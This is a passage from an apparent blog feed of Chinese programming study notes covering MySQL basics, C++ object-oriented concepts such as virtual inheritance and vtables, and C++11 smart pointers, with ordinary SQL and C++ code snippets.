        <content type="html"><![CDATA[<ol><li><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2></li></ol><p>到官网进行安装。点击MySQL Installer for Windows下载安装包后一直next即可。</p><ol start="2"><li><h2 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h2></li></ol><p>mysql开机默认启动。</p><p>在win+R运行services.msc，找到mysql右键操作。</p><p>在cmd中运行net start mysql80、net stop mysql80进行启动与停止。</p><ol start="3"><li><h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2></li></ol><p>方式一：直接使用mysql提供的命令行进行连接。开始找到MySQL Command Line Client-Unicode，进去输入密码操作。</p><p>方式二：先配置PATH环境变量C:\Program Files\MySQL\MySQL Server 8.0\bin。在任意cmd输入mysql -u root -p，输入密码操作。</p><ol start="4"><li><h2 id="MySQL数据库的好处"><a href="#MySQL数据库的好处" class="headerlink" title="MySQL数据库的好处"></a>MySQL数据库的好处</h2></li></ol><p>关系型数据库RDBMS，建立在关系模型基础上，由多张相互连接的二维表组成的数据库。格式统一，便于维护，使用SQL语言操作，使用方便。数据模型是数据库，可以创建多个表。</p><ol start="5"><li><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2></li></ol><p>  （1） SQL通用语法</p><p>  <img src="/.io//image-20220608212631284.png" alt="image-20220608212631284"></p><p>  （2） SQL分类</p><p>  <img src="/.io//image-20220608231123489.png" alt="image-20220608231123489"></p><p>  （3） DDL</p><p>  ​查询数据库</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">select</span> database();# 查询当前数据库</span><br></pre></td></tr></table></figure><p>  ​如果创建了同样名称的数据库会报错。一般使用以下指令创建。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span>;</span><br></pre></td></tr></table></figure><p>  ​在创建数据库的时候可以指定字符集。utf8只占有三个字节，而某些数据会占据四个字节，因此一般设置为utf8mb4</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> <span class="keyword">default</span> charset utf8mb4;</span><br></pre></td></tr></table></figure><p>  ​删除数据库 删除不存在的数据库同样会报错，因此使用以下指令进行删除</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> database IF <span class="keyword">EXISTS</span> databaseName;</span><br></pre></td></tr></table></figure><p>  ​数据库使用</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE databaseName;</span><br></pre></td></tr></table></figure><p>  ​表创建</p><ul><li>数据类型quality</li></ul><p>  ​1）数值类型</p><p>  <img src="/.io//image-20220609124851766.png" alt="image-20220609124851766"></p><p>  ​定义float和double类型时，需要两个参数。如score double(4, 1)代表4个长度，最多1位小数。</p><p>  ​定义无符号时应该是 age TINYINT UNSIGNED;,unsigned放在数据类型后面。</p><p>  ​2） 字符串类型</p><p>  <img src="/.io//image-20220609125257798.png" alt="image-20220609125257798"></p><p>  ​sql中字符串为varchar(size)，size是字符串的长度。一旦超出size会报错。varchar会动态占用内存，而char不管多大都必定占用size内存。但是char性能更高。</p><p>  ​例如用户名适合用varchar，性别适合用char。</p><p>  ​3） 日期类型</p><p>  <img src="/.io//image-20220609125639480.png" alt="image-20220609125639480"></p><p>  birthday date;</p><p>  注意最后一个字段没有逗号。 </p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> tableName(</span><br><span class="line">字段<span class="number">1</span> 字段<span class="number">1</span>类型 COMMENT “字段<span class="number">1</span>注释”,</span><br><span class="line">    ...</span><br><span class="line">    字段n 字段n类型 COMMENT “字段n注释”</span><br><span class="line">)COMMENT “表注释”；</span><br></pre></td></tr></table></figure><p>  ​查询当前数据库所有表，需要先用use指令进入数据库。</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES;</span><br></pre></td></tr></table></figure><p>  ​查询表结构</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DESC</span> databaseName;</span><br></pre></td></tr></table></figure><p>  ​查询指定表的建表语句，用于展示详细注释</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> databaseName;</span><br></pre></td></tr></table></figure><ul><li>案例</li></ul><p>  <img src="/.io//image-20220609130454987.png" alt="image-20220609130454987"></p><p>  ​表修改</p><p>  1）添加字段</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">ADD</span> fieldName quality COMMENT “注释” 约束;</span><br></pre></td></tr></table></figure><p>  <img src="/.io//image-20220612192330899.png" alt="image-20220612192330899"></p><p>​2） 修改数据类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName MDOIFY fieldName newQuality(size);</span><br></pre></td></tr></table></figure><p>​3） 修改字段名和字段类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName CHANGE oldTableName newTableName quality(size) COMMENT &quot;注释&quot; 约束;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220613164607169.png" alt="image-20220613164607169"></p><p>​4)删除字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName <span class="keyword">DROP</span> filedName;</span><br></pre></td></tr></table></figure><p>​5)修改表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> tableName RENAME <span class="keyword">TO</span> newTableName;</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20220613164847531.png" alt="image-20220613164847531"></p><p>​6)删除表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> tableName;</span><br></pre></td></tr></table></figure><p>​7)删除指定表，并重新创建空的表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> tableName;</span><br></pre></td></tr></table></figure><ol start="6"><li>图形化工具DataGrip</li></ol><p>进入后点击左上角加号，新增mysql Data Sources ,配置文件。user填root，密码随便设置，确认后下载驱动文件。</p><p>​1） 创建数据库</p><p>右键 new 选择schema，填写名字。</p><pre><code> 2）新建表</code></pre><p>右键数据库 创建表，填写名字和注释信息。在colums中创建字段。点击execute。</p><p>​3）修改表</p><p>右键数据库 modify table</p><p>​4）使用sql语句操作 </p><p>右键 new quary console</p><p>​（4）DML 增删改操作</p><p><img src="/.io//image-20220618161047205.png" alt="image-20220618161047205"></p><p><img src="/.io//image-20220618161121394.png" alt="image-20220618161121394"></p><p><img src="/.io//image-20220618161328719.png" alt="image-20220618161328719"></p><p>如果没有where条件，会修改所有数据。</p><p><img src="/.io//image-20220618161853602.png" alt="image-20220618161853602"></p><p>（5）DQL 查操作 关键字：SELECT</p><p> 1）基础查询</p><p><img src="/.io//image-20220618162123361.png" alt="image-20220618162123361"></p><p>查询可以起别名。SELECT … as ‘ ,,, ‘ from …;其中as可以省略。</p><p>查询如果不要重复，可以在select后加distinct关键字。</p><p><img src="/.io//image-20220618163140955.png" alt="image-20220618163140955"></p><p><img src="/.io//image-20220618163247041.png" alt="image-20220618163247041"></p><p><img src="/.io//image-20220618163307080.png" alt="image-20220618163307080"></p><ul><li>聚合函数</li></ul><p><img src="/.io//image-20220618163412171.png" alt="image-20220618163412171"></p><p>count不会统计null，最好采用count(*)</p><p>2） 分组查询</p><p><img src="/.io//image-20220618163708910.png" alt="image-20220618163708910"></p><p><img src="/.io//image-20220618163846266.png" alt="image-20220618163846266"></p><p><img src="/.io//image-20220618163948066.png" alt="image-20220618163948066"></p><p>3） 排序查询</p><p><img src="/.io//image-20220618164045538.png" alt="image-20220618164045538"></p><p>如果是多字段排序，字段一 一样时才会用第二种排序</p><p>4） 分页查询</p><p><img src="/.io//image-20220618164338732.png" alt="image-20220618164338732"></p><ul><li>编写顺序与执行顺序</li></ul><p><img src="/.io//image-20220618164904815.png" alt="image-20220618164904815"></p><p>（6）DCL 管理数据库用户、控制数据库访问权限</p><p>1） 用户</p><p><img src="/.io//image-20220618165210119.png" alt="image-20220618165210119"></p><p><img src="/.io//image-20220618165444310.png" alt="image-20220618165444310"></p><p>2） 权限</p><p><img src="/.io//image-20220618165522969.png" alt="image-20220618165522969"></p><p><img src="/.io//image-20220618165546535.png" alt="image-20220618165546535"></p><p>主机名可以用’%’通配，表名用’*’通配。</p><ol start="7"><li>函数 mysql内置了函数。select 函数名();</li></ol><p>（1）字符串函数</p><p><img src="/.io//image-20220618165858267.png" alt="image-20220618165858267"></p><p>（2）数值函数</p><p><img src="/.io//image-20220618170006506.png" alt="image-20220618170006506"></p><p>（3）日期函数</p><p><img src="/.io//image-20220618170109965.png" alt="image-20220618170109965"></p><p>type填写YEAR、MONTH、DAY</p><p>（4）流程函数</p><p><img src="/.io//image-20220618170305620.png" alt="image-20220618170305620"></p><p><img src="/.io//image-20220618170413188.png" alt="image-20220618170413188"></p><ol start="8"><li>约束 保证数据的正确性和完整性</li></ol><p><img src="/.io//image-20220618170648105.png" alt="image-20220618170648105"></p><p><img src="/.io//image-20220618170843417.png" alt="image-20220618170843417"></p><p><img src="/.io//image-20220618171037126.png" alt="image-20220618171037126"></p><p>尽管没有插入成功，数据也会向mysql申请主键。</p><p>在可视化创建数据的时候可以直接勾选。</p><ul><li>外键关联 表之间的联系</li></ul><p><img src="/.io//image-20220618171436873.png" alt="image-20220618171436873"></p><p><img src="/.io//image-20220618171631373.png" alt="image-20220618171631373"></p><p><img src="/.io//image-20220618171705691.png" alt="image-20220618171705691"></p><p><img src="/.io//image-20220618171815398.png" alt="image-20220618171815398"></p><ol start="9"><li><p>事务 要么全部成功，要么全部失败</p><p> 方式一</p></li></ol><p><img src="/.io//image-20220618172507776.png" alt="image-20220618172507776"></p><p>​方式二</p><p><img src="/.io//image-20220618172801474.png" alt="image-20220618172801474"></p><ul><li>事务的四大特性</li></ul><p><img src="/.io//image-20220618172956835.png" alt="image-20220618172956835"></p><ul><li>并发事务问题</li></ul><p><img src="/.io//image-20220618173159379.png" alt="image-20220618173159379"></p><p>解决方法：事务的隔离级别</p><p><img src="/.io//image-20220618173605287.png" alt="image-20220618173605287"></p><h2 id="python-3中运行pip-install-Mysqlclient-通过import-MySQLdb来建立数据库的连接。"><a href="#python-3中运行pip-install-Mysqlclient-通过import-MySQLdb来建立数据库的连接。" class="headerlink" title="python 3中运行pip install Mysqlclient, 通过import MySQLdb来建立数据库的连接。"></a>python 3中运行pip install Mysqlclient, 通过import MySQLdb来建立数据库的连接。</h2>]]></content>
      
      
      <categories>
          
          <category> MySQL </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面向对象</title>
      <link href="/2023/03/22/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2023/03/22/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="explicit"><a href="#explicit" class="headerlink" title="explicit"></a>explicit</h2><p>关键字，作为返回值时加上不调用拷贝构造函数。作为类关键字防止被拷贝。</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>父类指针指向子类对象</p><p>父类提供virtual 虚函数，子类对象实现</p><p>析构函数加virtual，可以调用子类的析构函数</p><p>构造函数前不能加virtual，因为构造函数执行后，虚表才出现</p><h2 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h2><p><img src="/.io//image-20230315211914313.png" alt="image-20230315211914313"></p><p>类中，++i比i++效率高，因为后者还要调用构造函数</p><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>用父类指针作为返回值，在返回值创建子类对象</p><p><img src="/.io//image-20230315201712599.png" alt="image-20230315201712599"></p><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="单体模式"><a href="#单体模式" class="headerlink" title="单体模式"></a>单体模式</h2><h2 id="sizeof、-countof"><a href="#sizeof、-countof" class="headerlink" title="sizeof、_countof"></a>sizeof、_countof</h2><p>_tscanf_s( _T(“%d”), v1, _countof(v1));</p><p><img src="/.io//image-20230315203513264.png" alt="image-20230315203513264"></p><p>sizeof 数据类型大小与数据大小相乘，实际的数据大小</p><p>countof 数据大小，实际上的数据数量</p><h2 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h2><p>大小为4，1，8，按最大的对齐</p><p><img src="/.io//image-20230315204035697.png" alt="image-20230315204035697"></p><p>如上，实际上为16。double占8，另外两个加起来用8</p><h2 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h2><p>函数名一样，参数类型不同，参数数量不同</p><p>与返回值类型<strong>无关</strong></p><p>使用const，<strong>发生</strong>重载。</p><p><img src="/.io//image-20230315204445450.png" alt="image-20230315204445450"></p><p>const是常对象调用的。</p><h2 id="菱形继承"><a href="#菱形继承" class="headerlink" title="菱形继承"></a>菱形继承</h2><p>一个派生类D是由多继承产生的，它的多个基类B、C继承了同一个基类A。造成派生类D中具有多份A类的属性，属于一种不合理的现象</p><p><img src="/.io//20190118194303573.png" alt="img"></p><p>会让高层的基类在底层的派生类中拥有多份成员，造成二义性。</p><p>解决方法：使用作用域、利用虚继承</p><p>在使用时加上作用域</p><p><img src="/.io//image-20230319195155868.png" alt="image-20230319195155868"></p><p>但是不能解决多次拷贝的问题</p><h2 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h2><p><img src="/.io//image-20230319195311020.png" alt="image-20230319195311020"></p><p>给所有函数都加上virtual 继承时使用虚继承</p><p><img src="/.io//image-20230319195704646.png" alt="image-20230319195704646"></p><p>使用虚继承时，第一成员是一个指针，指向一个结构体，里面第二成员是一个十六进制偏移。偏移值是父类到子类的偏移。</p><p>虚继承中，父类指针只能访问子类对象被继承的部分。因为在定义的时候，有一个偏移指向对应的数据。</p><p><img src="/.io//image-20230319200336941.png" alt="image-20230319200336941"></p><h2 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h2><p>将父类中函数定义为虚函数后，会出现一个虚表指针（4或8）在上述结构体的第一成员（第二成员是到子类的偏移），指向一个数组。数组中存放的都是函数，如果孩子实现了这个函数，就会放入孩子的。如果孩子的没实现，就会放入自己的。</p><p><img src="/.io//v2-0fceb07713e411d48b4c361452129585_1440w.webp" alt="img"></p><p>类A是基类，类B继承类A，类C又继承类B。类A，类B，类C，假设在子类有实现，其对象模型如下图所示。</p><p><img src="/.io//v2-dfe4aefdee7e06cf3151b57492ed42a2_1440w.webp" alt="img"></p><p>若菱形继承，两个父类均有对虚函数的实现，而子类没有对虚函数的实现，就会出现二义性问题。一般来说，子类都会进行实现，不会出现这种问题。</p><p>经常在父类的析构函数前加virtual，是为了在释放内存时使用子类的析构函数。</p><h2 id="纯虚类"><a href="#纯虚类" class="headerlink" title="纯虚类"></a>纯虚类</h2><p>父类使用纯虚函数<code>virtual void show() = 0;</code>它不会实例化一个对象，在子类继承的时候也会把纯虚函数继承，它强制性要求，派生类必须实现某个接口，不然无法实例化对象</p><p><img src="/.io//20190116230607742.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>智能指针</title>
      <link href="/2023/03/22/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/"/>
      <url>/2023/03/22/%E6%99%BA%E8%83%BD%E6%8C%87%E9%92%88/</url>
      
        <content type="html"><![CDATA[<h2 id="智能指针-c-11"><a href="#智能指针-c-11" class="headerlink" title="智能指针 c++11"></a>智能指针 c++11</h2><h3 id="std-unique-ptr-lt-T-gt-：独占资源所有权的指针。"><a href="#std-unique-ptr-lt-T-gt-：独占资源所有权的指针。" class="headerlink" title="std::unique_ptr&lt;T&gt; ：独占资源所有权的指针。"></a><code>std::unique_ptr&lt;T&gt;</code> ：独占资源所有权的指针。</h3><p>当我们独占资源的所有权的时候，可以使用 std::unique_ptr 对资源进行管理——离开 unique_ptr 对象的作用域时，会自动释放资源。</p><p>std::unique_ptr 是 move-only 的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; uptr = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">std::unique_ptr&lt;<span class="type">int</span>&gt; uptr1 = uptr;  <span class="comment">// 编译错误，std::unique_ptr&lt;T&gt; 是 move-only 的</span></span><br></pre></td></tr></table></figure><p>std::unique_ptr 可以指向一个数组。</p><p>可以自定义 deleter。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">FileCloser</span> &#123;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(FILE* fp)</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (fp != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">                <span class="built_in">fclose</span>(fp);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;;  </span><br><span class="line">    <span class="function">std::unique_ptr&lt;FILE, FileCloser&gt; <span class="title">uptr</span><span class="params">(fopen(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    std::unique_ptr&lt;FILE, std::function&lt;<span class="type">void</span>(FILE*)&gt;&gt; <span class="built_in">uptr</span>(</span><br><span class="line">        <span class="built_in">fopen</span>(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>), [](FILE* fp) &#123;</span><br><span class="line">            <span class="built_in">fclose</span>(fp);</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="std-shared-ptr-lt-T-gt-：共享资源所有权的指针。"><a href="#std-shared-ptr-lt-T-gt-：共享资源所有权的指针。" class="headerlink" title="std::shared_ptr&lt;T&gt; ：共享资源所有权的指针。"></a><code>std::shared_ptr&lt;T&gt;</code> ：共享资源所有权的指针。</h3><p>其实就是对资源做引用计数——当引用计数为 0 的时候，自动释放资源。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt; sptr = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">1</span>);  <span class="comment">// 此时引用计数为 1</span></span><br><span class="line">    &#123;   </span><br><span class="line">        std::shared_ptr&lt;<span class="type">int</span>&gt; sptr1 = sptr;</span><br><span class="line">        <span class="built_in">assert</span>(sptr.<span class="built_in">get</span>() == sptr1.<span class="built_in">get</span>());</span><br><span class="line">        <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">2</span>);   <span class="comment">// sptr 和 sptr1 共享资源，引用计数为 2</span></span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">assert</span>(sptr.<span class="built_in">use_count</span>() == <span class="number">1</span>);   <span class="comment">// sptr1 已经释放</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// use_count 为 0 时自动释放内存</span></span><br></pre></td></tr></table></figure><p>也可以指向数组和自定义 deleter。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="comment">// C++20 才支持 std::make_shared&lt;int[]&gt;</span></span><br><span class="line">    <span class="comment">// std::shared_ptr&lt;int[]&gt; sptr = std::make_shared&lt;int[]&gt;(100);</span></span><br><span class="line">    <span class="function">std::shared_ptr&lt;<span class="type">int</span>[]&gt; <span class="title">sptr</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>])</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        sptr[i] = i * i;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        std::cout &lt;&lt; sptr[i] &lt;&lt; std::endl;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function">std::shared_ptr&lt;FILE&gt; <span class="title">sptr</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        fopen(<span class="string">&quot;test_file.txt&quot;</span>, <span class="string">&quot;w&quot;</span>), [](FILE* fp) &#123;</span></span></span><br><span class="line"><span class="params"><span class="function">            std::cout &lt;&lt; <span class="string">&quot;close &quot;</span> &lt;&lt; fp &lt;&lt; std::endl;</span></span></span><br><span class="line"><span class="params"><span class="function">            fclose(fp);</span></span></span><br><span class="line"><span class="params"><span class="function">        &#125;)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个 shared_ptr 对象的内存开销要比裸指针和无自定义 deleter 的 unique_ptr 对象略大。</p><p>shared_ptr 需要维护的信息有两部分：</p><ol><li>指向共享资源的指针。</li><li>引用计数等共享资源的控制信息——实现上是维护一个指向控制信息的指针。</li></ol><p>所以，shared_ptr 对象需要保存两个指针。shared_ptr 的 的 deleter 是保存在控制信息中，所以，是否有自定义 deleter 不影响 shared_ptr 对象的大小。</p><p><img src="/.io//v2-e48536157d6181fdb97181769a7c364a_1440w.webp" alt="img"></p><p>不能去掉 shared_ptr 对象中指向共享资源的指针。 因为 shared_ptr 对象中的指针指向的对象不一定和控制块中的指针指向的对象一样。（由于多态的存在，有可能指向父类对象）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Fruit</span> &#123;</span><br><span class="line">    <span class="type">int</span> juice;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Vegetable</span> &#123;</span><br><span class="line">    <span class="type">int</span> fiber;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Tomato</span> : <span class="keyword">public</span> Fruit, Vegetable &#123;</span><br><span class="line">    <span class="type">int</span> sauce;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 由于继承的存在，shared_ptr 可能指向基类对象</span></span><br><span class="line">std::shared_ptr&lt;Tomato&gt; tomato = std::<span class="built_in">make_shared</span>&lt;Tomato&gt;();</span><br><span class="line">std::shared_ptr&lt;Fruit&gt; fruit = tomato;</span><br><span class="line">std::shared_ptr&lt;Vegetable&gt; vegetable = tomato;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-8dfc6105c0016d7c22e6212732faf1ef_1440w.webp" alt="img"></p><p>std::shared_ptr 支持 aliasing constructor。</p><p>Aliasing constructor，简单说就是构造出来的 shared_ptr 对象和参数 r 指向同一个控制块（会影响 r 指向的资源的生命周期），但是指向共享资源的指针是参数 ptr。看下面这个例子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Vec = std::vector&lt;<span class="type">int</span>&gt;;</span><br><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">GetSPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> elts = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line">    std::shared_ptr&lt;Vec&gt; pvec = std::<span class="built_in">make_shared</span>&lt;Vec&gt;(elts);</span><br><span class="line">    <span class="keyword">return</span> std::<span class="built_in">shared_ptr</span>&lt;<span class="type">int</span>&gt;(pvec, &amp;(*pvec)[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt; sptr = <span class="built_in">GetSPtr</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">-2</span>; i &lt; <span class="number">3</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sptr.<span class="built_in">get</span>()[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/.io//v2-ada2e2b5dc8551bf879d77a2b484e071_1440w.webp" alt="img"></p><p>使用 std::shared_ptr 时，会涉及两次内存分配：一次分配共享资源对象；一次分配控制块。C++ 标准库提供了 std::make_shared 函数来创建一个 shared_ptr 对象，只需要一次内存分配。</p><p><img src="/.io//v2-49e619699b5c924097e027cd173df758_1440w.webp" alt="img"></p><p>这种情况下，不用通过控制块中的指针，我们也能知道共享资源的位置——这个指针也可以省略掉。</p><p><img src="/.io//v2-4d50514c2c685097588908f69c3dc027_1440w.webp" alt="img"></p><p>成员函数获取 this 的 shared_ptr 的正确的做法是继承 std::enable_shared_from_this。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span> : <span class="keyword">public</span> std::enable_shared_from_this&lt;Bar&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function">std::shared_ptr&lt;Bar&gt; <span class="title">GetSPtr</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">shared_from_this</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> sptr1 = std::<span class="built_in">make_shared</span>&lt;Bar&gt;();</span><br><span class="line"><span class="built_in">assert</span>(sptr1.<span class="built_in">use_count</span>() == <span class="number">1</span>);</span><br><span class="line"><span class="keyword">auto</span> 